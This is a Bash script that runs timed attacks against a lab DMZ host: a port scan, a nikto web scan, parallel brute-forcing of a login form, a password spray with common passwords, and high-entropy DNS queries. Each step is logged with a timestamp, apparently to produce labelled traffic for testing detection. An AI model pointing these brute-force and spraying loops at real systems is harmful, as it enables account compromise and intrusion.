#!/usr/bin/env bash
DMZ=10.10.30.10
LOG=~/ataques-cyberflow-$(date +%Y%m%d-%H%M%S).txt
m(){ printf '%s  %s\n' "$(date -u +%FT%T%z)" "$*" | tee -a "$LOG"; }
g(){ m "-- pausa 60s --"; sleep 60; }
m "=== INICIO (atacante 10.10.20.30 -> DMZ $DMZ) ==="
m "[1] port-scan INICIO"; nmap -sT -T4 -p- --open --max-retries 1 --host-timeout 6m "$DMZ" >>"$LOG" 2>&1; m "[1] port-scan FIN"; g
m "[2] web-scan INICIO"; nikto -h "http://$DMZ" -maxtime 120s >>"$LOG" 2>&1; m "[2] web-scan FIN"; g
m "[3] brute-force INICIO"; DUR=120; F=$(($(date +%s)+DUR)); for i in $(seq 20); do (while [ $(date +%s) -lt $F ]; do curl -s -o /dev/null -m2 --data "user=admin&pass=x$RANDOM" "http://$DMZ/login"; done) & done; wait; m "[3] brute-force FIN"; g
m "[4] password-spray INICIO"; for pw in admin123 password123 letmein123 qwerty123 welcome123 changeme123 spring2026 summer2026 test1234 demo12345; do curl -s -o /dev/null -m2 -H 'Content-Type: application/json' -X POST --data "{\"username\":\"demo\",\"password\":\"$pw\"}" "http://$DMZ/api/login"; sleep 0.2; done; m "[4] password-spray FIN"; g
m "[5] dns-entropy INICIO"; for i in $(seq 40); do L=$(head -c 12 /dev/urandom | base32 2>/dev/null | tr -d '=' | tr 'A-Z' 'a-z' | head -c 12); dig +short "@$DMZ" "$L.ppi.lab" A >/dev/null 2>&1; sleep 0.3; done; m "[5] dns-entropy FIN"
m "=== FIN ==="; echo "Bitacora: $LOG"
